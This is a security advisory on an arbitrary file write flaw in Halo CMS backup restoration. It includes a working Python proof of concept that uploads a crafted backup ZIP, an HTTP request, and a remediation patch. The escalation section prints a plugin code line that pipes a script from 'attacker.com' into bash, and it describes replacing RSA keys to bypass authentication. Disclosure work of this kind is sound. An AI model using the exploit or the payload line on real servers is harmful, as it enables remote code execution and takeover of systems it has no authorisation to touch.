# Halo CMS Backup Restore Arbitrary File Write Vulnerability

## Summary

A critical arbitrary file write vulnerability exists in the backup restoration functionality of Halo CMS versions up to 2.25.4. The `restoreWorkdir()` method in `MigrationServiceImpl.java` copies the `workdir/` directory from a user-supplied backup archive directly to the Halo application's working directory (`~/.halo2/`) without any validation of file types, path traversal protection, or symbolic link checks. An authenticated attacker with backup management privileges can craft a malicious backup ZIP file containing arbitrary files in the `workdir/` directory, which will be written to the server's working directory upon restoration, potentially leading to Remote Code Execution (RCE) via plugin JAR replacement or authentication bypass via RSA key replacement.

**CVSS v3.1 Score:** 8.8 (High)  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  
**CWE:** CWE-73 (External Control of File Name or Path)

---

## Affected Versions

- Halo CMS ≤ 2.25.4
- All versions with backup restoration functionality

---

## Vulnerability Details

### Root Cause

The vulnerability resides in the `restoreWorkdir()` method of `MigrationServiceImpl.java` (lines 230-243):

```java
private Mono<Void> restoreWorkdir(Path backupRoot) {
    return Mono.<Void>create(sink -> {
        try {
            var workdir = backupRoot.resolve("workdir");
            if (Files.exists(workdir)) {
                copyRecursively(workdir, haloProperties.getWorkDir());  // VULNERABLE LINE
            }
            sink.success();
        } catch (IOException e) {
            sink.error(e);
        }
    }).subscribeOn(scheduler);
}
```

The `copyRecursively()` method (Spring's `FileSystemUtils`) performs a recursive copy without:

1. **File type validation** - No check on file extensions or MIME types
2. **Path traversal protection** - No check for `..` sequences in filenames
3. **Symbolic link detection** - No check for symbolic links
4. **File size limits** - No restriction on file sizes
5. **Overwrite protection** - Silently overwrites existing files

### Attack Vector

The vulnerability is triggered through the backup restoration endpoint:

```
POST /apis/console.api.migration.halo.run/v1alpha1/restorations
Content-Type: multipart/form-data
```

The restoration process follows this sequence:

```
┌─────────────────────────────────────────────────────────────┐
│  MigrationServiceImpl.restore()                             │
│  1. unpackBackup() → Extract ZIP to temp directory          │
│  2. restoreExtensions() → Restore extensions.data           │
│  3. restoreWorkdir() → Copy workdir/ to ~/.halo2/           │
│     ↑ Arbitrary files written to working directory          │
└─────────────────────────────────────────────────────────────┘
```

### Malicious Backup Structure

A malicious backup ZIP file must contain:

```
malicious-backup.zip
├── extensions.data          # Required: Can be empty or contain valid JSONL
└── workdir/                 # Required: Contents copied to ~/.halo2/
    ├── PWNED_BY_POC.txt     # Proof of concept marker file
    ├── plugins/             # Plugin JARs for RCE
    │   └── evil-plugin.jar  # Malicious plugin
    └── keys/                # RSA keys for authentication bypass
        ├── pat_id_rsa       # Malicious private key
        └── pat_id_rsa.pub   # Malicious public key
```

### extensions.data Format

The `extensions.data` file must be valid for `restoreExtensions()` to succeed. Valid formats include:

1. **Empty file**: ` ` (empty content)

2. **Empty line**: `\n` (newline only)

3. **Valid JSONL**: One `ExtensionStore` object per line:

   ```json
   {"name": "/registry/test/dummy", "data": "e30=", "version": 1}
   ```

   Where `data` is base64-encoded content.

---

## Exploitation Steps

### Prerequisites

- Authenticated user with backup management privileges
- Network access to Halo API

### Step 1: Create Malicious Backup

```python
import zipfile
import io

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    # Empty extensions.data (passes restoreExtensions validation)
    zf.writestr('extensions.data', '\n')

    # Arbitrary file to write to ~/.halo2/
    zf.writestr('workdir/PWNED_BY_POC.txt',
                'Arbitrary file write confirmed!')

with open('malicious-backup.zip', 'wb') as f:
    f.write(buf.getvalue())
```

### Step 2: Upload Malicious Backup

```http
POST /apis/console.api.migration.halo.run/v1alpha1/restorations HTTP/1.1
Host: target-halo-server
Content-Type: multipart/form-data; boundary=----boundary
Cookie: SESSION=<session_id>

------boundary
Content-Disposition: form-data; name="file"; filename="backup.zip"
Content-Type: application/zip

<ZIP file binary content>
------boundary--
```

### Step 3: Verify File Written

```bash
# On the Halo server
ls -la ~/.halo2/PWNED_BY_POC.txt
cat ~/.halo2/PWNED_BY_POC.txt
```

---

## Impact Analysis

### Direct Impact

1. **Arbitrary File Write**: Attacker can write any file to `~/.halo2/`
2. **File Overwrite**: Existing files are silently overwritten

### Escalation Scenarios

| Attack Vector           | Target File                | Impact                  | Severity |
| ----------------------- | -------------------------- | ----------------------- | -------- |
| Plugin JAR Replacement  | `~/.halo2/plugins/*.jar`   | Remote Code Execution   | Critical |
| RSA Key Replacement     | `~/.halo2/keys/pat_id_rsa` | Authentication Bypass   | Critical |
| Theme Replacement       | `~/.halo2/themes/*`        | Stored XSS              | High     |
| Configuration Overwrite | `~/.halo2/*.yaml`          | Security Control Bypass | High     |

### RCE via Plugin JAR Replacement

An attacker can replace a legitimate plugin JAR with a malicious one containing:

```java
@Extension
public class MaliciousExtension {
    @PostConstruct
    public void init() {
        // Execute arbitrary command
        Runtime.getRuntime().exec("bash -c 'curl attacker.com/shell.sh | bash'");
    }
}
```

When the plugin is loaded, the malicious code executes with the privileges of the Halo process.

---

## Proof of Concept

### Python PoC Script

```python
#!/usr/bin/env python3
"""
Halo CMS Backup Restore Arbitrary File Write PoC
Vulnerability: Backup Restore Arbitrary File Write
CVSS: 8.8 (High)
"""

import io
import sys
import zipfile
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://target:8090"
SESSION = sys.argv[2] if len(sys.argv) > 2 else "SESSION=xxx"

def create_malicious_backup():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('extensions.data', '\n')
        zf.writestr('workdir/PWNED_BY_POC.txt',
                    'Halo backup restore arbitrary file write confirmed!')
    buf.seek(0)
    return buf

def exploit():
    backup = create_malicious_backup()
    url = f"{TARGET}/apis/console.api.migration.halo.run/v1alpha1/restorations"
    files = {'file': ('backup.zip', backup, 'application/zip')}
    headers = {'Cookie': SESSION}

    r = requests.post(url, files=files, headers=headers, verify=False, timeout=60)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:300]}")

    if r.status_code == 200:
        print("\n[+] SUCCESS! Check: cat ~/.halo2/PWNED_BY_POC.txt")

if __name__ == "__main__":
    exploit()
```

### Verification

Frontend Backup Management Address:http://ip:port/console/backup

```bash
# Execute PoC
python3 poc.py http://192.168.49.128:8090 "SESSION=f3d4ae4a-c1ac-46ec-bfe8-82e3206ee232"

# On Halo server
cat ~/.halo2/PWNED_BY_POC.txt
```
<img width="1497" height="699" alt="image" src="https://github.com/user-attachments/assets/9226e52b-db7a-4bc1-aaa5-64a4ee881fb6" />

<img width="489" height="207" alt="image" src="https://github.com/user-attachments/assets/315fdb12-42fa-4249-8a9e-4b76e0873611" />


---

## Remediation

### Recommended Fix

Add validation to `restoreWorkdir()` method:

```java
private Mono<Void> restoreWorkdir(Path backupRoot) {
    return Mono.<Void>create(sink -> {
        try {
            var workdir = backupRoot.resolve("workdir");
            if (Files.exists(workdir)) {
                // Validate no path traversal
                checkDirectoryTraversal(backupRoot, workdir);

                // Validate no symbolic links
                Files.walkFileTree(workdir, new SimpleFileVisitor<Path>() {
                    @Override
                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                        if (attrs.isSymbolicLink()) {
                            throw new SecurityException("Symbolic links not allowed");
                        }
                        return FileVisitResult.CONTINUE;
                    }
                });

                // Copy with validation
                copyRecursively(workdir, haloProperties.getWorkDir());
            }
            sink.success();
        } catch (IOException e) {
            sink.error(e);
        }
    }).subscribeOn(scheduler);
}
```

### Additional Recommendations

1. **Implement backup signing**: Cryptographically sign backups to prevent tampering
2. **Add file type allowlist**: Only allow specific file types in workdir
3. **Implement file size limits**: Restrict maximum file sizes
4. **Add audit logging**: Log all backup restoration operations
5. **Require re-authentication**: Require password confirmation for backup restoration

---

## References

- **Vendor**: https://github.com/halo-dev/halo
- **Affected Code**: `application/src/main/java/run/halo/app/migration/impl/MigrationServiceImpl.java`
- **CWE-73**: https://cwe.mitre.org/data/definitions/73.html
- **CVSS Calculator**: https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

---

## Timeline

- **Discovery Date**: 2026-07-10
- **Vendor Notification**: [Pending]
- **Public Disclosure**: [Pending]

---

## Credits

- **Discoverer**: LIAN

---

## Disclaimer

This vulnerability disclosure is intended for security research purposes only. The author is not responsible for any misuse of this information. Always obtain proper authorization before testing systems for vulnerabilities.
